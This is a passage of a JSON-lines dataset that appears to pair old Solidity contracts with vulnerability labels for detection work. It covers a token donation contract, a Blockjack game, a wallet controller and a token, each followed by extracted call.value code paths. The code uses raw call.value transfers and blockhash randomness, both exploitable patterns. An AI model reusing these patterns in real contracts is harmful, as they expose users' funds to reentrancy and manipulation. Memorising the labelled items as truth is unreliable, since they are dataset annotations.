mapping(address => uint) public weiDonated; address public foundationWallet; address public registrarAuth; address public exchangeRateAuth; address public masterAuth; uint phaseOfRound0; uint phaseOfRound1; event DonationReceipt (address indexed addr, string indexed currency, uint indexed bonusMultiplierApplied, uint timestamp, uint tokenAmount, bytes32 memo); event EarlyContribReceipt (address indexed addr, uint tokenAmount, bytes32 memo); event BurnReceipt (address indexed addr, uint tokenAmountBurned); function FDC(address _masterAuth, string _name) TokenTracker(earlyContribShare) StepFunction(round1EndTime-round1StartTime, round1InitialBonus, round1BonusSteps) { name = _name; foundationWallet  = _masterAuth; masterAuth     = _masterAuth; exchangeRateAuth  = _masterAuth; registrarAuth  = _masterAuth; stateOfPhase[0] = state.earlyContrib; addPhase(round0StartTime); stateOfPhase[1] = state.round0; addPhase(round0EndTime); stateOfPhase[2] = state.offChainReg; addPhase(round1StartTime); stateOfPhase[3] = state.round1; addPhase(round1EndTime); stateOfPhase[4] = state.offChainReg; addPhase(finalizeStartTime); stateOfPhase[5] = state.finalization; addPhase(finalizeEndTime); stateOfPhase[6] = state.done; phaseOfRound0 = 1; phaseOfRound1 = 3; setMaxDelay(phaseOfRound0 - 1, maxRoundDelay); setMaxDelay(phaseOfRound1 - 1, maxRoundDelay); setTarget(phaseOfRound0, round0Target); setTarget(phaseOfRound1, round1Target); } function getState() constant returns (state) { return stateOfPhase[getPhaseAtTime(now)]; } function getMultiplierAtTime(uint time) constant returns (uint) { uint n = getPhaseAtTime(time); if (stateOfPhase[n] == state.round0) { return 100 + round0Bonus; } if (stateOfPhase[n] == state.round1) { return 100 + getStepFunction(time - getPhaseStartTime(n)); } throw; } function donateAsWithChecksum(address addr, bytes4 checksum) payable returns (bool) { bytes32 hash = sha256(addr); if (bytes4(hash) != checksum) { throw ; } return donateAs(addr); } function finalize(address addr) { if (getState() != state.finalization) { throw; } closeAssignmentsIfOpen(); uint tokensBurned = unrestrict(addr); BurnReceipt(addr, tokensBurned); if (isUnrestricted()) { endCurrentPhaseIn(0); } } function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); } function getStatus(uint donationRound, address dfnAddr, address fwdAddr) public constant returns ( state currentState, uint fxRate, uint currentMultiplier, uint donationCount, uint totalTokenAmount, uint startTime, uint endTime, bool isTargetReached, uint chfCentsDonated, uint tokenAmount, uint fwdBalance, uint donated) { currentState = getState(); if (currentState == state.round0 || currentState == state.round1) { currentMultiplier = getMultiplierAtTime(now); } fxRate = weiPerCHF; donationCount = totalUnrestrictedAssignments; totalTokenAmount = totalUnrestrictedTokens; if (donationRound == 0) { startTime = getPhaseStartTime(phaseOfRound0); endTime = getPhaseStartTime(phaseOfRound0 + 1); isTargetReached = targetReached(phaseOfRound0); chfCentsDonated = counter[phaseOfRound0]; } else { startTime = getPhaseStartTime(phaseOfRound1); endTime = getPhaseStartTime(phaseOfRound1 + 1); isTargetReached = targetReached(phaseOfRound1); chfCentsDonated = counter[phaseOfRound1]; } tokenAmount = tokens[dfnAddr]; donated = weiDonated[dfnAddr]; fwdBalance = fwdAddr.balance; } function setWeiPerCHF(uint weis) { if (msg.sender != exchangeRateAuth) { throw; } weiPerCHF = weis; } function registerEarlyContrib(address addr, uint tokenAmount, bytes32 memo) { if (msg.sender != registrarAuth) { throw; } if (getState() != state.earlyContrib) { throw; } if (!isRegistered(addr, true)) { earlyContribList.push(addr); } assign(addr, tokenAmount, true); EarlyContribReceipt(addr, tokenAmount, memo); } function registerOffChainDonation(address addr, uint timestamp, uint chfCents, string currency, bytes32 memo) { if (msg.sender != registrarAuth) { throw; } uint currentPhase = getPhaseAtTime(now); state currentState = stateOfPhase[currentPhase]; if (currentState != state.round0 && currentState != state.round1 && currentState != state.offChainReg) { throw; } if (timestamp > now) { throw; } uint timestampPhase = getPhaseAtTime(timestamp); state timestampState = stateOfPhase[timestampPhase]; if ((currentState == state.round0 || currentState == state.round1) && (timestampState != currentState)) { throw; } if (currentState == state.offChainReg && timestampPhase != currentPhase-1) { throw; } if (memoUsed[memo]) { throw; } memoUsed[memo] = true; bookDonation(addr, timestamp, chfCents, currency, memo); } function delayDonPhase(uint donPhase, uint timedelta) { if (msg.sender != registrarAuth) { throw; } if (donPhase == 0) { delayPhaseEndBy(phaseOfRound0 - 1, timedelta); } else if (donPhase == 1) { delayPhaseEndBy(phaseOfRound1 - 1, timedelta); } } function setFoundationWallet(address newAddr) { if (msg.sender != masterAuth) { throw; } if (getPhaseAtTime(now) >= phaseOfRound0) { throw; } foundationWallet = newAddr; } function setExchangeRateAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } exchangeRateAuth = newAuth; } function setRegistrarAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } registrarAuth = newAuth; } function setMasterAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } masterAuth = newAuth; } function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); } function bookDonation(address addr, uint timestamp, uint chfCents, string currency, bytes32 memo) private { uint phase = getPhaseAtTime(timestamp); bool targetReached = addTowardsTarget(phase, chfCents); if (targetReached && phase == getPhaseAtTime(now)) { if (phase == phaseOfRound0) { endCurrentPhaseIn(gracePeriodAfterRound0Target); } else if (phase == phaseOfRound1) { endCurrentPhaseIn(gracePeriodAfterRound1Target); } } uint bonusMultiplier = getMultiplierAtTime(timestamp); chfCents = (chfCents * bonusMultiplier) / 100; uint tokenAmount = (chfCents * tokensPerCHF) / 100; if (!isRegistered(addr, false)) { donorList.push(addr); } assign(addr,tokenAmount,false); DonationReceipt(addr, currency, bonusMultiplier, timestamp, tokenAmount, memo); } } "}
{"sol name": "39664_1.sol", "label": 0, "first path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "second path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "third path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "long path": "library ArrayLib { function insertInPlace(uint8[] storage self, uint8 n) { uint8 insertingIndex = 0; while (self.length > 0 && insertingIndex < self.length && self[insertingIndex] < n) { insertingIndex += 1; } self.length += 1; for (uint8 i = uint8(self.length) - 1; i > insertingIndex; i--) { self[i] = self[i - 1]; } self[insertingIndex] = n; } } library DeckLib { using ArrayLib for uint8[]; enum Suit { Spades, Hearts, Clubs, Diamonds } uint8 constant cardsPerSuit = 13; uint8 constant suits = 4; uint8 constant totalCards = cardsPerSuit * suits; struct Deck { uint8[] usedCards; address player; uint256 gameID; } function init(Deck storage self, uint256 gameID)  { self.usedCards = new uint8[](0); self.player = msg.sender; self.gameID = gameID; } function getCard(Deck storage self, uint256 blockNumber)  returns (uint8)  { uint cardIndex = self.usedCards.length; if (cardIndex >= totalCards) throw; uint8 r = uint8(getRandomNumber(blockNumber, self.player, self.gameID, cardIndex, totalCards - cardIndex)); for (uint8 i = 0; i < cardIndex; i++) { if (self.usedCards[i] <= r) r += 1; } self.usedCards.insertInPlace(r); return r; } function cardDescription(uint8 self) constant returns (Suit, uint8) { return (Suit(self / cardsPerSuit), cardFacevalue(self)); } function cardEmojified(uint8 self) constant returns (uint8, string) { string memory emojiSuit; var (suit, number) = cardDescription(self); if (suit == Suit.Clubs) emojiSuit = \"\u2663\ufe0f\"; else if (suit == Suit.Diamonds) emojiSuit = \"\u2666\ufe0f\"; else if (suit == Suit.Hearts) emojiSuit = \"\u2665\ufe0f\"; else if (suit == Suit.Spades) emojiSuit = \"\u2660\ufe0f\"; return (number, emojiSuit); } function cardFacevalue(uint8 self) constant returns (uint8) { return 1 + self % cardsPerSuit; } function blackjackValue(uint8 self) constant returns (uint8) { uint8 cardValue = cardFacevalue(self); return cardValue < 10 ? cardValue : 10; } function getRandomNumber(uint b, address player, uint256 gameID, uint n, uint m) constant returns (uint) { bytes32 blockHash = block.blockhash(b); if (blockHash == 0x0) throw; return uint(uint256(keccak256(blockHash, player, gameID, n)) % m); } } contract AbstractBlockjackLogs { event GameEnded(uint256 gameID, address player, uint gameResult, uint256 payout, uint8 playerHand, uint8 houseHand); event GameNeedsTick(uint256 gameID, address player, uint256 actionBlock); function recordLog(uint256 gameID, address player, uint gameResult, uint256 payout, uint8 playerHand, uint8 houseHand); function tickRequiredLog(uint256 gameID, address player, uint256 actionBlock); } library GameLib { using DeckLib for *; uint8 constant houseLimit = 17; uint8 constant target = 21; enum ComparaisonResult { First, Second, Tie } enum GameState { InitialCards, Waiting, Hit, Stand, DoubleDown, Finished } enum GameResult { Ongoing, House, Tie, Player, PlayerNatural } struct Game { address player; uint256 bet; uint256 payout; uint256 gameID; DeckLib.Deck deck; uint8[] houseCards; uint8[] playerCards; uint256 actionBlock; GameState state; GameResult result; bool closed; } function init(Game storage self, uint256 gameID) { self.player = msg.sender; self.bet = msg.value; self.payout = 0; self.houseCards = new uint8[](0); self.playerCards = new uint8[](0); self.actionBlock = block.number; self.state = GameState.InitialCards; self.result = GameResult.Ongoing; self.closed = false; self.gameID = gameID; self.deck.init(gameID); } function tick(Game storage self) returns (bool) { if (block.number <= self.actionBlock) return false; if (self.actionBlock + 255 < block.number) { endGame(self, GameResult.House); return true; } if (!needsTick(self)) return true; if (self.state == GameState.InitialCards) dealInitialCards(self); if (self.state == GameState.Hit) dealHitCard(self); if (self.state == GameState.DoubleDown) { if (!canDoubleDown(self)) throw; self.bet += msg.value; dealHitCard(self); forceStand(self); } if (self.state == GameState.Stand) { dealHouseCards(self); checkGameResult(self); } else { checkGameContinues(self); } return true; } function needsTick(Game storage self) constant returns (bool) { if (self.state == GameState.Waiting) return false; if (self.state == GameState.Finished) return false; return true; } function checkGameResult(Game storage self)  { uint8 houseHand = countHand(self.houseCards); if (houseHand == target && self.houseCards.length == 2) return endGame(self, GameResult.House); ComparaisonResult result = compareHands(houseHand, countHand(self.playerCards)); if (result == ComparaisonResult.First) return endGame(self, GameResult.House); if (result == ComparaisonResult.Second) return endGame(self, GameResult.Player); endGame(self, GameResult.Tie); } function checkGameContinues(Game storage self)  { uint8 playerHand = countHand(self.playerCards); if (playerHand == target && self.playerCards.length == 2) return endGame(self, GameResult.PlayerNatural); if (playerHand > target) return endGame(self, GameResult.House); if (playerHand == target) { forceStand(self); if (!tick(self)) throw; } } function forceStand(Game storage self) { uint256 currentActionBlock = self.actionBlock; playerDecision(self, GameState.Stand); self.actionBlock = currentActionBlock; } function canDoubleDown(Game storage self) returns (bool) { if (self.playerCards.length > 2) return false; uint8 totalPlayer = countHand(self.playerCards); if (totalPlayer < 9 || totalPlayer > 11) return false; if (msg.value != self.bet) return false; } function playerDecision(Game storage self, GameState decision)  { if (self.state != GameState.Waiting) throw; if (decision != GameState.Hit && decision != GameState.Stand) throw; self.state = decision; self.actionBlock = block.number; } function dealInitialCards(Game storage self) private { self.playerCards.push(self.deck.getCard(self.actionBlock)); self.houseCards.push(self.deck.getCard(self.actionBlock)); self.playerCards.push(self.deck.getCard(self.actionBlock)); self.state = GameState.Waiting; } function dealHitCard(Game storage self) private { self.playerCards.push(self.deck.getCard(self.actionBlock)); self.state = GameState.Waiting; } function dealHouseCards(Game storage self) private { self.houseCards.push(self.deck.getCard(self.actionBlock)); if (countHand(self.houseCards) < houseLimit) dealHouseCards(self); } function endGame(Game storage self, GameResult result) { self.result = result; self.state = GameState.Finished; self.payout = payoutForResult(self.result, self.bet); closeGame(self); } function closeGame(Game storage self) private { if (self.closed) throw; if (self.state != GameState.Finished) throw; self.closed = true; if (self.payout > 0) { if (!self.player.send(self.payout)) throw; } } function payoutForResult(GameResult result, uint256 bet) private returns (uint256) { if (result == GameResult.PlayerNatural) return bet * 5 / 2; if (result == GameResult.Player) return bet * 2; if (result == GameResult.Tie) return bet; return 0; } function countHand(uint8[] memory hand)  returns (uint8) { uint8[] memory possibleSums = new uint8[](1); for (uint i = 0; i < hand.length; i++) { uint8 value = hand[i].blackjackValue(); uint l = possibleSums.length; for (uint j = 0; j < l; j++) { possibleSums[j] += value; if (value == 1) { possibleSums = appendArray(possibleSums, possibleSums[j] + 10); } } } return bestSum(possibleSums); } function bestSum(uint8[] possibleSums)  returns (uint8 bestSum) { bestSum = 50; for (uint i = 0; i < possibleSums.length; i++) { if (compareHands(bestSum, possibleSums[i]) == ComparaisonResult.Second) { bestSum = possibleSums[i]; } } return; } function appendArray(uint8[] memory array, uint8 n)  returns (uint8[] memory) { uint8[] memory newArray = new uint8[](array.length + 1); for (uint8 i = 0; i < array.length; i++) { newArray[i] = array[i]; } newArray[array.length] = n; return newArray; } function compareHands(uint8 a, uint8 b)  returns (ComparaisonResult) { if (a <= target && b <= target) { if (a > b) return ComparaisonResult.First; if (a < b) return ComparaisonResult.Second; } if (a > target && b > target) { if (a < b) return ComparaisonResult.First; if (a > b) return ComparaisonResult.Second; } if (a > target) return ComparaisonResult.Second; if (b > target) return ComparaisonResult.First; return ComparaisonResult.Tie; } } contract Blockjack { AbstractBlockjackLogs blockjacklogs; using GameLib for GameLib.Game; GameLib.Game[] games; mapping (address => uint256) public currentGame; bool contractCleared; uint256 public minBet = 50 finney; uint256 public maxBet = 500 finney; bool public allowsNewGames = false; uint256 public maxBlockActions = 10; mapping (uint256 => uint256) blockActions; address public DX = 0x296Ae1d2D9A8701e113EcdF6cE986a4a7D0A6dC5; address public DEV = 0xBC4343B11B7cfdd6dD635f61039b8a66aF6E73Bb; address public ADMIN_CONTRACT; uint256 public BANKROLL_LOCK_PERIOD = 30 days; uint256 public bankrollLockedUntil; uint256 public profitsLockedUntil; uint256 public initialBankroll; uint256 public currentBankroll; mapping (address => bool) public isOwner; modifier onlyOwner { if (!isOwner[msg.sender]) throw; _; } modifier only(address x) { if (msg.sender != x) throw; _; } modifier onlyPlayer(uint256 gameID) { if (msg.sender != games[gameID].player) throw; _; } modifier blockActionProtected { blockActions[block.number] += 1; if (blockActions[block.number] > maxBlockActions) throw; _; } function Blockjack(address _admin_contract, address _logs_contract) { ADMIN_CONTRACT = _admin_contract; blockjacklogs = AbstractBlockjackLogs(_logs_contract); games.length += 1; games[0].init(0); games[0].player = this; setupTrustedAccounts(); } function () payable { startGame(); } function startGame() blockActionProtected payable { if (!allowsNewGames) throw; if (msg.value < minBet) throw; if (msg.value > maxBet) throw; uint256 currentGameId = currentGame[msg.sender]; if (games.length > currentGameId) { GameLib.Game openedGame = games[currentGameId]; if (openedGame.player == msg.sender && !openedGame.closed) { if (!openedGame.tick()) throw; if (!openedGame.closed) throw; recordEndedGame(currentGameId); } } uint256 newGameID = games.length; games.length += 1; games[newGameID].init(newGameID); currentGame[msg.sender] = newGameID; tickRequiredLog(games[newGameID]); } function hit(uint256 gameID) onlyPlayer(gameID) blockActionProtected { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.Hit); tickRequiredLog(game); } function doubleDown(uint256 gameID) onlyPlayer(gameID) blockActionProtected payable { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.DoubleDown); tickRequiredLog(game); } function stand(uint256 gameID) onlyPlayer(gameID) blockActionProtected { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.Stand); tickRequiredLog(game); } function gameTick(uint256 gameID) blockActionProtected { GameLib.Game openedGame = games[gameID]; if (openedGame.closed) throw; if (!openedGame.tick()) throw; if (openedGame.closed) recordEndedGame(gameID); } function recordEndedGame(uint gameID) private { GameLib.Game openedGame = games[gameID]; if(currentBankroll + openedGame.bet > openedGame.payout){ currentBankroll = currentBankroll + openedGame.bet - openedGame.payout; } blockjacklogs.recordLog( openedGame.gameID, openedGame.player, uint(openedGame.result), openedGame.payout, GameLib.countHand(openedGame.playerCards), GameLib.countHand(openedGame.houseCards) ); } function tickRequiredLog(GameLib.Game storage game) private { blockjacklogs.tickRequiredLog(game.gameID, game.player, game.actionBlock); } function gameState(uint i) constant returns (uint8[], uint8[], uint8, uint8, uint256, uint256, uint8, uint8, bool, uint256) { GameLib.Game game = games[i]; return ( game.houseCards, game.playerCards, GameLib.countHand(game.houseCards), GameLib.countHand(game.playerCards), game.bet, game.payout, uint8(game.state), uint8(game.result), game.closed, game.actionBlock ); } function setupTrustedAccounts() internal { isOwner[DX] = true; isOwner[DEV] = true; isOwner[ADMIN_CONTRACT] = true; } function changeDev(address newDev) only(DEV) { isOwner[DEV] = false; DEV = newDev; isOwner[DEV] = true; } function changeDX(address newDX) only(DX) { isOwner[DX] = false; DX = newDX; isOwner[DX] = true; } function changeAdminContract(address _new_admin_contract) only(ADMIN_CONTRACT) { isOwner[ADMIN_CONTRACT] = false; ADMIN_CONTRACT = _new_admin_contract; isOwner[ADMIN_CONTRACT] = true; } function setSettings(uint256 _min, uint256 _max, uint256 _maxBlockActions) only(ADMIN_CONTRACT) { minBet = _min; maxBet = _max; maxBlockActions = _maxBlockActions; } function registerOwner(address _new_watcher) only(ADMIN_CONTRACT) { isOwner[_new_watcher] = true; } function removeOwner(address _old_watcher) only(ADMIN_CONTRACT) { isOwner[_old_watcher] = false; } function stopBlockjack() onlyOwner { allowsNewGames = false; } function startBlockjack() only(ADMIN_CONTRACT) { allowsNewGames = true; } function addBankroll() only(DX) payable { initialBankroll += msg.value; currentBankroll += msg.value; } function remainingBankroll() constant returns (uint256) { return currentBankroll > initialBankroll ? initialBankroll : currentBankroll; } function removeBankroll() only(DX) { if (initialBankroll > currentBankroll - 5 ether && bankrollLockedUntil > now) throw; stopBlockjack(); if (currentBankroll > initialBankroll) { if (!DEV.send(currentBankroll - initialBankroll)) throw; } suicide(DX); contractCleared = true; } function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; } suicide(DX); } function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; } } "}
{"sol name": "12182_1.sol", "label": 0, "first path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "second path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "third path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "long path": "pragma solidity ^0.4.23; contract Ownable { address public owner; modifier onlyOwner() { require(msg.sender == owner); _; } constructor() public { owner = msg.sender; } function setOwner(address _owner) public onlyOwner returns (bool) { require(_owner != address(0)); owner = _owner; return true; } } interface TokenHandler { function handleTokens(Token _token) public returns (bool); } contract HasWorkers is Ownable { mapping(address => uint256) private workerToIndex; address[] private workers; event AddedWorker(address _worker); event RemovedWorker(address _worker); constructor() public { workers.length++; } modifier onlyWorker() { require(isWorker(msg.sender)); _; } modifier workerOrOwner() { require(isWorker(msg.sender) || msg.sender == owner); _; } function isWorker(address _worker) public view returns (bool) { return workerToIndex[_worker] != 0; } function allWorkers() public view returns (address[] memory result) { result = new address[](workers.length - 1); for (uint256 i = 1; i < workers.length; i++) { result[i - 1] = workers[i]; } } function addWorker(address _worker) public onlyOwner returns (bool) { require(!isWorker(_worker)); uint256 index = workers.push(_worker) - 1; workerToIndex[_worker] = index; emit AddedWorker(_worker); return true; } function removeWorker(address _worker) public onlyOwner returns (bool) { require(isWorker(_worker)); uint256 index = workerToIndex[_worker]; address lastWorker = workers[workers.length - 1]; workerToIndex[lastWorker] = index; workers[index] = lastWorker; workers.length--; delete workerToIndex[_worker]; emit RemovedWorker(_worker); return true; } } contract ControllerStorage { address public walletsDelegate; address public controllerDelegate; address public forward; uint256 public createdWallets; mapping(bytes32 => bytes32) public gStorage; } contract WalletStorage { address public owner; } contract DelegateProxy { function delegatedFwd(address _dst, bytes _calldata) internal { assembly { let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0) let size := returndatasize let ptr := mload(0x40) returndatacopy(ptr, 0, size) switch result case 0 { revert(ptr, size) } default { return(ptr, size) } } } } contract DelegateProvider { function getDelegate() public view returns (address delegate); } contract ControllerProxy is ControllerStorage, Ownable, HasWorkers, DelegateProvider, DelegateProxy { function getDelegate() public view returns (address delegate) { delegate = walletsDelegate; } function setWalletsDelegate(address _delegate) public onlyOwner returns (bool) { walletsDelegate = _delegate; return true; } function setControllerDelegate(address _delegate) public onlyOwner returns (bool) { controllerDelegate = _delegate; return true; } function() public payable { if (gasleft() > 2400) { delegatedFwd(controllerDelegate, msg.data); } } } contract Token { function transfer(address _to, uint _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); function approve(address _spender, uint256 _value) returns (bool success); function increaseApproval (address _spender, uint _addedValue) public returns (bool success); function balanceOf(address tokenOwner) public constant returns (uint balance); } contract WalletProxy is WalletStorage, DelegateProxy { event ReceivedETH(address from, uint256 amount); constructor() public { owner = msg.sender; } function() public payable { if (msg.value > 0) { emit ReceivedETH(msg.sender, msg.value); } if (gasleft() > 2400) { delegatedFwd(DelegateProvider(owner).getDelegate(), msg.data); } } } contract Wallet is WalletStorage { function transferERC20Token(Token token, address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return token.transfer(to, amount); } function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); } function() public payable {} } contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); } function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); } function setForward(address _forward) public onlyOwner returns (bool) { emit ChangedForward(forward, _forward, msg.sender); forward = _forward; return true; } function createWallets(uint256 number) public onlyWorker returns (bool) { for (uint256 i = 0; i < number; i++) { emit CreatedUserWallet(new WalletProxy()); } createdWallets += number; return true; } function withdrawEth(Wallet wallet) public onlyWorker returns (bool result) { uint256 balance = address(wallet).balance; result = wallet.transferEther(forward, balance); if (result) { emit WithdrawEth(wallet, forward, balance); } } function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); } } forward.call.value(address(this).balance)(); return true; } function withdrawERC20(Token token, Wallet wallet) public onlyWorker returns (bool result) { uint256 balance = token.balanceOf(wallet); result = wallet.transferERC20Token(token, forward, balance); if (result) { emit WithdrawToken(token, wallet, forward, balance); } TokenHandler(forward).handleTokens(token); } function withdrawERC20Batch(Token token, Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = token.balanceOf(wallet); if (wallet.transferERC20Token(token, forward, balance)) { emit WithdrawToken(token, wallet, forward, balance); } } TokenHandler(forward).handleTokens(token); return true; } function() public payable {} } "}
{"sol name": "32559_1.sol", "label": 0, "first path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "second path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "third path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "long path": "pragma solidity ^0.4.18; contract useContractWeb { ContractWeb internal web = ContractWeb(0x0); } contract Owned { address public owner = msg.sender; function transferOwner(address _newOwner) onlyOwner public returns (bool) { owner = _newOwner; return true; } modifier onlyOwner { require(msg.sender == owner); _; } } contract CheckPayloadSize { modifier onlyPayloadSize(uint256 _size) { require(msg.data.length >= _size + 4); _; } } contract CanTransferTokens is CheckPayloadSize, Owned { function transferCustomToken(address _token, address _to, uint256 _value) onlyPayloadSize(3 * 32) onlyOwner public returns (bool) { Token tkn = Token(_token); return tkn.transfer(_to, _value); } } contract SafeMath { function add(uint256 x, uint256 y) pure internal returns (uint256) { require(x <= x + y); return x + y; } function sub(uint256 x, uint256 y) pure internal returns (uint256) { require(x >= y); return x - y; } } contract CheckIfContract { function isContract(address _addr) view internal returns (bool) { uint256 length; if (_addr == address(0x0)) return false; assembly { length := extcodesize(_addr) } if(length > 0) { return true; } else { return false; } } } contract ContractReceiver { TKN internal fallback; struct TKN { address sender; uint256 value; bytes data; bytes4 